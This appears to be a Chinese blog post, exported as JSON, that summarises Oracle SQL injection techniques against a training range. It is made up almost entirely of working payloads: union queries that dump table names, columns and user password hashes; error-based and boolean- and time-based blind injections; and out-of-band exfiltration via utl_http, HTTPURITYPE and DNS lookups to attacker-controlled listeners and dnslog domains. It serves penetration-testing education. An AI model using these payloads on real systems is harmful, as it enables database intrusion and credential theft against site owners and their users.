dual\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353844960-cad323f3-f77c-4c12-b1e8-9250896245b8.png#align=left&display=inline&height=254&margin=%5Bobject%2Object%5D&name=image.png&originHeight=508&originWidth=1252&size=21553&status=done&style=none&width=626)\n获取第二个表名**LOGMNR_GLOBAL$**\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select table_name from user_tables where rownum=1 and table_name not in 'LOGMNR_SESSION_EVOLVE$') from dual\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353863561-54f3d94e-8596-40c9-9f49-d2520256d80f.png#align=left&display=inline&height=238&margin=%5Bobject%2Object%5D&name=image.png&originHeight=476&originWidth=1166&size=18009&status=done&style=none&width=583)\n获取第三个表名**LOGMNR_GT_TAB_INCLUDE$**\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select table_name from user_tables where rownum=1 and table_name not in 'LOGMNR_SESSION_EVOLVE$' and table_name not in 'LOGMNR_GLOBAL$') from dual\n```\n### 模糊搜索查询\n获取sns_users表名\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select table_name from user_tables where table_name like '%user%' and rownum=1) from dual\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354561532-baf25308-92eb-42f2-bc57-e95ddd2b1891.png#align=left&display=inline&height=346&margin=%5Bobject%2Object%5D&name=image.png&originHeight=692&originWidth=2496&size=125987&status=done&style=none&width=1248)\n## 7、查询数据库列名\n### 直接查询\n获取sns_users表里的字段\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where table_name='sns_users' and rownum=1) from dual\n\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where rownum=1 and column_name not in 'USER_NAME') from dual\n\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where rownum=1 and column_name not in 'USER_NAME' and column_name not in 'AGENT_NAME') from dual\n\n……………\n\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where rownum=1 and column_name not in 'USER_NAME' and column_name not in 'AGENT_NAME' and column_name not in 'PROTOCOL' and column_name not in 'SPARE1' and column_name not in 'DB_USERNAME' and column_name not in 'OID' and column_name <> 'EVENTID' and column_name <> 'NAME' and column_name <> 'TABLE_OBJNO') from dual\n```\n```\n获取如下字段：\nUSER_NAME\nAGENT_NAME\nPROTOCOL\nSPARE1\nDB_USERNAME\nOID\nEVENTID\nNAME\nTABLE_OBJNO\nUSAGE\nUSER_PWD\n…………\n```\n### 模糊搜索查询\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where table_name='sns_users' and rownum=1 and column_name like '%USER%') from dual\n\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select 'null',(select column_name from user_tab_columns where table_name='sns_users' and rownum=1 and column_name like '%USER%' and column_name <> 'USER_NAME') from dual\n```\n## 8、查询数据库数据\n获取账号密码字段内容\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from \"sns_users\" where rownum=1\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355758027-eb920ce1-1667-40c4-9703-bf055011ce09.png#align=left&display=inline&height=332&margin=%5Bobject%2Object%5D&name=image.png&originHeight=664&originWidth=2436&size=124453&status=done&style=none&width=1218)\n\n\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from \"sns_users\" where rownum=1 and USER_NAME <> 'zhong'\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355803061-53c045a9-600d-4231-911b-a0b145fd8d32.png#align=left&display=inline&height=308&margin=%5Bobject%2Object%5D&name=image.png&originHeight=616&originWidth=2470&size=127349&status=done&style=none&width=1235)\n```\nhttp://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from \"sns_users\" where rownum=1 and USER_NAME <> 'zhong' and USER_NAME not in 'hu'\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355829407-d770aa94-c339-4686-8131-9c5b9910039e.png#align=left&display=inline&height=288&margin=%5Bobject%2Object%5D&name=image.png&originHeight=576&originWidth=2436&size=121972&status=done&style=none&width=1218)\n解密获取密码392118\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355905460-f2485164-b4a8-4419-a99f-9752107804b7.png#align=left&display=inline&height=390&margin=%5Bobject%2Object%5D&name=image.png&originHeight=780&originWidth=1526&size=108851&status=done&style=none&width=763)\n\n\n## 9、美化输出\nOracle采用||进行数据连接\n```\nhttp://219.153.49.228:44768/new_list.php?id=-1 union select '用户名：'||USER_NAME,'密码：'||USER_PWD from \"sns_users\" where rownum=1\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627356270321-022d9ac4-944b-4251-9f20-fa13afadd1b9.png#align=left&display=inline&height=281&margin=%5Bobject%2Object%5D&name=image.png&originHeight=562&originWidth=2512&size=124098&status=done&style=none&width=1256)\n# 0x04 报错注入\n报错注入是一种通过函数报错前进行子查询获取数据，再通过错误页面回显的一种注入手法，下面介绍几种报错注入函数以及获取一些常见的获取数据，实际操作只需要将子查询内的查询语句进行替换即可。\n## 1、ctxsys.drithsx.sn()\n```\n#获取当前数据库用户 ORACLE1\n?id=1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370671892-ba68c50c-4b25-48c6-8121-2ee170485de9.png#align=left&display=inline&height=357&margin=%5Bobject%2Object%5D&name=image.png&originHeight=714&originWidth=2512&size=177516&status=done&style=none&width=1256)\n```\n#获取数据库版本信息\n?id=1 and 1=ctxsys.drithsx.sn(1,(select banner from sys.v_$version where rownum=1)) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370745612-670ae342-fb32-42ff-8b48-bd894e0b6d3f.png#align=left&display=inline&height=341&margin=%5Bobject%2Object%5D&name=image.png&originHeight=682&originWidth=2492&size=195982&status=done&style=none&width=1246)\n## 2、XMLType()\n```\n?id=1 and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464280011-c070c8c1-5831-4516-93a5-d9de8e4728b2.png#align=left&display=inline&height=466&margin=%5Bobject%2Object%5D&name=image.png&originHeight=932&originWidth=1860&size=83611&status=done&style=none&width=930)\n## 3、dbms_xdb_version.checkin()\n```\n#获取数据库版本信息\n?id=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370853172-60c1003a-f2bc-45e7-88e4-e1dc5b544009.png#align=left&display=inline&height=352&margin=%5Bobject%2Object%5D&name=image.png&originHeight=704&originWidth=2466&size=181678&status=done&style=none&width=1233)\n## 4、bms_xdb_version.makeversioned()\n```\n#获取当前数据库用户 ORACLE1\n?id=1 and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371068298-bf405b32-0774-4999-b59c-5f972ff993eb.png#align=left&display=inline&height=299&margin=%5Bobject%2Object%5D&name=image.png&originHeight=598&originWidth=2500&size=157266&status=done&style=none&width=1250)\n## 5、dbms_xdb_version.uncheckout()\n```\n#获取数据库版本信息\n?id=1 and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371151615-1dc8551d-bb05-4b01-ab12-fb20b684f7b1.png#align=left&display=inline&height=305&margin=%5Bobject%2Object%5D&name=image.png&originHeight=610&originWidth=2464&size=184586&status=done&style=none&width=1232)\n## 6、dbms_utility.sqlid_to_sqlhash()\n```\n#获取数据库版本信息\n?id=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371240951-badc7016-575d-4a23-9d5b-24d99923c150.png#align=left&display=inline&height=306&margin=%5Bobject%2Object%5D&name=image.png&originHeight=612&originWidth=2500&size=190889&status=done&style=none&width=1250)\n## 7、ordsys.ord_dicom.getmappingxpath()\n```\n?id=1 and 1=ordsys.ord_dicom.getmappingxpath((select banner from sys.v_$version where rownum=1),user,user)--\n```\n## 8、utl_inaddr.*()\nutl_inaddr（用于取得局域网或Internet环境中的主机名和IP地址）\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627369182388-db5976e4-c62c-460c-a76e-4a3b9fdadf0e.png#align=left&display=inline&height=444&margin=%5Bobject%2Object%5D&name=image.png&originHeight=888&originWidth=1480&size=138926&status=done&style=none&width=740)\n```\n?id=1 and 1=utl_inaddr.get_host_name((select user from dual)) --\n?id=1 and 1=utl_inaddr.get_host_address((select user from dual)) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464133762-13bb4b59-3f8f-466a-b970-082352b0484e.png#align=left&display=inline&height=398&margin=%5Bobject%2Object%5D&name=image.png&originHeight=796&originWidth=1692&size=57659&status=done&style=none&width=846)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464181708-702fd815-478b-488f-8c3a-565adb5fb2f4.png#align=left&display=inline&height=458&margin=%5Bobject%2Object%5D&name=image.png&originHeight=916&originWidth=1810&size=65997&status=done&style=none&width=905)\n# 0x05 布尔型盲注\n常用猜解：\n```\n#猜长度\n?id=1 and 6=(select length(user) from dual)--\n#截取值猜ascii码\n?id=1 and (select ascii(substr(user,1,1)) from dual)>83\n?id=1 and (select ascii(substr(user,1,1)) from dual)=83\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627358275597-570e4d7d-7594-4570-bd79-ff983c61706e.png#align=left&display=inline&height=380&margin=%5Bobject%2Object%5D&name=image.png&originHeight=760&originWidth=2404&size=187790&status=done&style=none&width=1202)\n## 1、decode函数布尔盲注\ndecode(字段或字段的运算，值1，值2，值3）\n这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3\n\n### 测试用户名长度\n```\nhttp://219.153.49.228:44768/new_list.php?id=1 and 6=(select length(user) from dual) --\n```\n### 测试当前用户是否为SYSTEM\n```\n#如果是system用户则返回正常，不是则返回不正常\nhttp://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(user,'SYSTEM',1,0) from dual) -- \n```\n```\n#使用substr截断，逐个字段进行猜解\nhttp://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(substr(user,1,1),'S',1,0) from dual) -- \n?id=1 and 1=(select decode(substr(user,2,1),'Y',1,0) from dual) -- \n?id=1 and 1=(select decode(substr(user,3,1),'S',1,0) from dual) --\n?id=1 and 1=(select decode(substr(user,4,1),'T',1,0) from dual) --\n?id=1 and 1=(select decode(substr(user,5,1),'E',1,0) from dual) --\n?id=1 and 1=(select decode(substr(user,6,1),'M',1,0) from dual) --\n\n#当然也可以配合ascii码进行猜解\n?id=1 and 1=(select decode(ascii(substr(user,1,1)),'83',1,0) from dual) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627366490187-723fa9dc-c6d7-4858-a429-d98bbe77cab4.png#align=left&display=inline&height=436&margin=%5Bobject%2Object%5D&name=image.png&originHeight=872&originWidth=2424&size=197040&status=done&style=none&width=1212)\n## 2、instr函数布尔盲注\ninstr函数的应用：\n```\nselect instr('abcdefgh','de') position from dual;\n#返回结果：4\n```\n盲注中的应用：\n```\nhttp://219.153.49.228:44768/new_list.php?id=1 and 1=(instr((select user from dual),'SYS')) --\n?id=1 and 4=(instr((select user from dual),'T')) --\n```\n# 0x06 延时盲注\n## 1、检测漏洞存在\nDBMS_PIPE.RECEIVE_MESSAGE函数的作用是从指定管道获取消息。\n具体用法为：**DBMS_PIPE.RECEIVE_MESSAGE('pipename',timeout)**\n**pipename**为varchar(128)的字符串，用以指定管道名称，在这里我们输入任意值即可。\n**timeout**为integer的可选输入参数，用来指定等待时间。\n常用payload如下：\n```\nhttp://219.153.49.228:44768/new_list.php?id=1 and 1=dbms_pipe.receive_message('o', 10)--\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627365780661-fefb7bcc-e426-4014-8c09-9803fbb76335.png#align=left&display=inline&height=421&margin=%5Bobject%2Object%5D&name=image.png&originHeight=842&originWidth=2528&size=312249&status=done&style=none&width=1264)\n如果页面延时10秒返回，即存在注入。\n## 2、配合decode函数延时盲注\n只需要将延时语句放入decode函数中即可\n```\n#直接猜解字符\n?id=1 and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('o',5),0) from dual) --\n\n#通过ascii猜解字符\n?id=1 and 1=(select decode(ascii(substr(user,1,1)),'83',dbms_pipe.receive_message('o',5),0) from dual) --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627366016814-7d8cdee4-c932-4907-87e0-017ae7f6296f.png#align=left&display=inline&height=506&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1012&originWidth=2146&size=293305&status=done&style=none&width=1073)\n## 3、使用其他延时查询来判断\n如(select count(*) from all_objects) ，因为查询结果需要一定的时间，在无法使用dbms_pipe.receive_message()函数的情况下可以使用这个。具体操作只需要将decode()函数的返回结果进行替换即可。\n```\n#直接猜解字符\n?id=1 and 1=(select decode(substr(user,1,1),'S',(select count(*) from all_objects),0) from dual) --\n\n#通过ascii猜解字符\n?id=1 and 1=(select decode(ascii(substr(user,1,1)),'83',(select count(*) from all_objects),0) from dual) --\n```\n# 0x07 外带数据注入\n## 1、url_http.request()\n使用此方法，用户需要有utl_http访问网络的权限\n首先检测是否支持，页面返回正常则表示支持\n```\n?id=1 and exists (select count(*) from all_objects where object_name='UTL_HTTP') --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464342525-e4cd81f2-77a8-4a90-ace7-36aa714ccdaa.png#align=left&display=inline&height=369&margin=%5Bobject%2Object%5D&name=image.png&originHeight=738&originWidth=1854&size=42432&status=done&style=none&width=927)\n然后python起一个http服务，或者开启nc监听。这里我使用python开启一个服务：\n```\npython3 -m http.server 4455\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464776325-cd84daca-3f18-48a5-86a3-9a92df1fdd05.png#align=left&display=inline&height=145&margin=%5Bobject%2Object%5D&name=image.png&originHeight=290&originWidth=1144&size=47561&status=done&style=none&width=572)\n```\n#子查询数据库版本信息并访问python起的http服务\n?id=1 and utl_http.request('http://192.168.100.130:4455/'||(select banner from sys.v_$version where rownum=1))=1--\n\n#http访问时可以将||进行URL编码\n?id=1 and utl_http.request('http://192.168.100.130:4455/'%7C%7C(select banner from sys.v_$version where rownum=1))=1--\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464897258-175be638-08f8-4355-8ce8-e2552bfdd355.png#align=left&display=inline&height=372&margin=%5Bobject%2Object%5D&name=image.png&originHeight=744&originWidth=1868&size=59899&status=done&style=none&width=934)\n可以看到成功获取了数据\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464921197-61542222-97e4-4941-b1d9-ca5bdcec6fe2.png#align=left&display=inline&height=234&margin=%5Bobject%2Object%5D&name=image.png&originHeight=468&originWidth=1454&size=124719&status=done&style=none&width=727)\n\n\n## 2、utl_inaddr.get_host_address()函数\n```\n#使用dnslog外带数据\n?id=1 and (select utl_inaddr.get_host_address((select user from dual)||'.eeaijt.dnslog.cn') from dual)is not null --\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627465955162-98de91a3-8382-4073-bcf3-18728762e3f1.png#align=left&display=inline&height=343&margin=%5Bobject%2Object%5D&name=image.png&originHeight=686&originWidth=1664&size=42677&status=done&style=none&width=832)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627465968725-e5b0236e-0e8d-4aa2-8556-eb6fbf6e935f.png#align=left&display=inline&height=283&margin=%5Bobject%2Object%5D&name=image.png&originHeight=566&originWidth=1680&size=59996&status=done&style=none&width=840)\n## 3、SYS.DBMS_LDAP.INIT()函数\n网上说是可以使用，我试着不行，收不到数据，不知道是不是环境问题。\n```\n?id=1 and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.51prg6.dnslog.cn',80) from dual)is not null --\n\n?id=1 and (select DBMS_LDAP.INIT((select user from dual)||'.51prg6.dnslog.cn',80) from dual)is not null --\n```\n## 4、HTTPURITYPE()函数\n```\n?id=1 and (select HTTPURITYPE('http://192.168.100.130:4455/'||(select user from dual)).GETCLOB() FROM DUAL)is not null --\n```\n同样需要python起一个http服务，或者nc创建监听\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627466748565-80964d64-450b-46fc-8f89-77bdb55ce3cd.png#align=left&display=inline&height=419&margin=%5Bobject%2Object%5D&name=image.png&originHeight=838&originWidth=1878&size=78666&status=done&style=none&width=939)\n虽然访问404，但是同样成功外带数据。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627466760517-a4a23a26-b2d0-4ea8-96c9-3a7c5470b395.png#align=left&display=inline&height=230&margin=%5Bobject%2Object%5D&name=image.png&originHeight=460&originWidth=1454&size=97022&status=done&style=none&width=727)\n# 0x08 总结\nOracle数据库注入跟日常的注入其实没有什么太大的分别，需要注意数据类型的一致性和常用表名列名的不同即可，在sql注入的原理上都是拼接sql语句并执行。在实战中企业还是有很大部分使用Oracle数据库，故在此进行分析总结，希望能够对渗透测试人员有所帮助。\n以上测试靶场采用墨者学院Oracle注入靶场、掌控安全Oralce注入靶场以及本地搭建的Oracle数据库，在实战中可能会遇到waf等安全设备的拦截，后续将针对Oracle数据库waf绕过编写一篇文章，敬请期待ing～\n","slug":"Oracle数据库注入总结","published":1,"updated":"2021-08-26T03:35:28.534Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpgj0056vkq3eidw6bp3","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<blockquote>\n<p>本文已发布到先知社区：<a href=\"https://xz.aliyun.com/t/9940\">https://xz.aliyun.com/t/9940</a></p>\n<p>作者：ajie</p>\n</blockquote>\n<h1 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h1><p>在渗透测试过程中，总是遇到不熟悉的数据库，知道了有SQL注入漏洞但是无法利用，这总让我很苦恼。因为网上的文章很多都是基于Mysql数据库的，当遇到Oracle数据库时有些数据库层面的不同点对于我们测试总会有点困扰，无法成功利用。故学习了Oracle数据库注入的相关知识，在此总结分享给大家，希望能够对安全从业人员有所帮助。<br>全文基于对于SQL注入具有一定理解，并且能够在Mysql数据库进行注入的基础上进行阐述。本文旨在讲述Oracle数据库多种情况下如何进行注入，注重实战，相关概念问题请自行查阅资料，谢谢理解～</p>\n<h1 id=\"0x02-注入点确定\"><a href=\"#0x02-注入点确定\" class=\"headerlink\" title=\"0x02 注入点确定\"></a>0x02 注入点确定</h1><p>跟其他数据库一样，检测注入点都是可以通过拼接and语句进行判断。这里通过and 1=1 和and 1=2进行判断。实战中还可以通过延时函数进行判断。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=1%20and%201=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353232047-3c17c5db-589b-4002-a82a-6fbe01e576fe.png#align=left&display=inline&height=439&margin=%5Bobject%2Object%5D&name=image.png&originHeight=878&originWidth=1608&size=122915&status=done&style=none&width=804\" alt=\"image.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=1%20and%201=2</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353242702-ec873de8-7a5e-4bf6-b14f-3768ee4e8e76.png#align=left&display=inline&height=278&margin=%5Bobject%2Object%5D&name=image.png&originHeight=556&originWidth=1578&size=35308&status=done&style=none&width=789\" alt=\"image.png\"></p>\n<h1 id=\"0x03-显错注入\"><a href=\"#0x03-显错注入\" class=\"headerlink\" title=\"0x03 显错注入\"></a>0x03 显错注入</h1><h2 id=\"1、判断字段数为2\"><a href=\"#1、判断字段数为2\" class=\"headerlink\" title=\"1、判断字段数为2\"></a>1、判断字段数为2</h2><p>与其他注入一样，这里通过order by来判断字段数。因为order by 2页面正常，order by 3页面不正常，故判断当前字段数为2。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=1%20order%20by%202</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353279684-e0cc78c5-4353-4770-82e2-44b3b6176214.png#align=left&display=inline&height=420&margin=%5Bobject%2Object%5D&name=image.png&originHeight=840&originWidth=1458&size=116992&status=done&style=none&width=729\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353306166-7c477672-384f-4899-ab58-d487f859a22d.png#align=left&display=inline&height=220&margin=%5Bobject%2Object%5D&name=image.png&originHeight=440&originWidth=1412&size=29793&status=done&style=none&width=706\" alt=\"image.png\"></p>\n<h2 id=\"2、获取显错点\"><a href=\"#2、获取显错点\" class=\"headerlink\" title=\"2、获取显错点\"></a>2、获取显错点</h2><p>联合查询这里使用了union select，oracle数据库与mysql数据库不同点在于它对于字段点数据类型敏感，也就是说我们不能直接union select 1,2,3来获取显错点了，需要在字符型字段使用字符型数据，整型字段使用整型数据才可以。如下，两个字段都为字符型，故使用union select ‘null’,’null’。<br>(在有些情况下也采用union all select的形式进行联合查询。union all select与union select的不同点可以很容易理解为all表示输出所有，也就是当数据出现相同时，将所有数据都输出；union select则会将相同数据进行过滤，只输出其中一条。)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#联合查询</span><br><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select null,null from dual</span><br><span class=\"line\">#修改null为&#x27;null&#x27;，判断字段类型均为字符型</span><br><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,&#x27;null&#x27; from dual</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353537650-e294e0ca-44d5-4884-9341-27dd41eff277.png#align=left&display=inline&height=500&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1000&originWidth=2526&size=171188&status=done&style=none&width=1263\" alt=\"image.png\"><br>后续便可以替换显错点进行注入。</p>\n<h2 id=\"3、查询数据库版本信息\"><a href=\"#3、查询数据库版本信息\" class=\"headerlink\" title=\"3、查询数据库版本信息\"></a>3、查询数据库版本信息</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select banner from sys.v_$version where rownum=1) from dual</span><br></pre></td></tr></table></figure>\n<h2 id=\"4、获取当前数据库连接用户\"><a href=\"#4、获取当前数据库连接用户\" class=\"headerlink\" title=\"4、获取当前数据库连接用户\"></a>4、获取当前数据库连接用户</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select sys_context(&#x27;userenv&#x27;,&#x27;current_user&#x27;) from dual) from dual</span><br><span class=\"line\"></span><br><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=-1 union select &#x27;1&#x27;,user from dual</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354142760-9af3da8c-9eb3-4592-9c52-24a10e962061.png#align=left&display=inline&height=347&margin=%5Bobject%2Object%5D&name=image.png&originHeight=694&originWidth=2492&size=123811&status=done&style=none&width=1246\" alt=\"image.png\"></p>\n<h2 id=\"5、查询当前数据库库名\"><a href=\"#5、查询当前数据库库名\" class=\"headerlink\" title=\"5、查询当前数据库库名\"></a>5、查询当前数据库库名</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select instance_name from V$INSTANCE) from dual</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354254697-9084c0a1-02ea-4da6-8f68-b579e31135fd.png#align=left&display=inline&height=338&margin=%5Bobject%2Object%5D&name=image.png&originHeight=676&originWidth=2510&size=123816&status=done&style=none&width=1255\" alt=\"image.png\"></p>\n<h2 id=\"6、查询数据库表名\"><a href=\"#6、查询数据库表名\" class=\"headerlink\" title=\"6、查询数据库表名\"></a>6、查询数据库表名</h2><p>查询表名一般查询admin或者user表</p>\n<h3 id=\"直接查询\"><a href=\"#直接查询\" class=\"headerlink\" title=\"直接查询\"></a>直接查询</h3><p>获取第一个表名<strong>LOGMNR_SESSION_EVOLVE$</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1) from dual</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353844960-cad323f3-f77c-4c12-b1e8-9250896245b8.png#align=left&display=inline&height=254&margin=%5Bobject%2Object%5D&name=image.png&originHeight=508&originWidth=1252&size=21553&status=done&style=none&width=626\" alt=\"image.png\"><br>获取第二个表名<strong>LOGMNR_GLOBAL$</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1 and table_name not in &#x27;LOGMNR_SESSION_EVOLVE$&#x27;) from dual</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353863561-54f3d94e-8596-40c9-9f49-d2520256d80f.png#align=left&display=inline&height=238&margin=%5Bobject%2Object%5D&name=image.png&originHeight=476&originWidth=1166&size=18009&status=done&style=none&width=583\" alt=\"image.png\"><br>获取第三个表名<strong>LOGMNR_GT_TAB_INCLUDE$</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1 and table_name not in &#x27;LOGMNR_SESSION_EVOLVE$&#x27; and table_name not in &#x27;LOGMNR_GLOBAL$&#x27;) from dual</span><br></pre></td></tr></table></figure>\n<h3 id=\"模糊搜索查询\"><a href=\"#模糊搜索查询\" class=\"headerlink\" title=\"模糊搜索查询\"></a>模糊搜索查询</h3><p>获取sns_users表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where table_name like &#x27;%user%&#x27; and rownum=1) from dual</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354561532-baf25308-92eb-42f2-bc57-e95ddd2b1891.png#align=left&display=inline&height=346&margin=%5Bobject%2Object%5D&name=image.png&originHeight=692&originWidth=2496&size=125987&status=done&style=none&width=1248\" alt=\"image.png\"></p>\n<h2 id=\"7、查询数据库列名\"><a href=\"#7、查询数据库列名\" class=\"headerlink\" title=\"7、查询数据库列名\"></a>7、查询数据库列名</h2><h3 id=\"直接查询-1\"><a href=\"#直接查询-1\" class=\"headerlink\" title=\"直接查询\"></a>直接查询</h3><p>获取sns_users表里的字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1) from dual</span><br><span class=\"line\"></span><br><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27;) from dual</span><br><span class=\"line\"></span><br><span 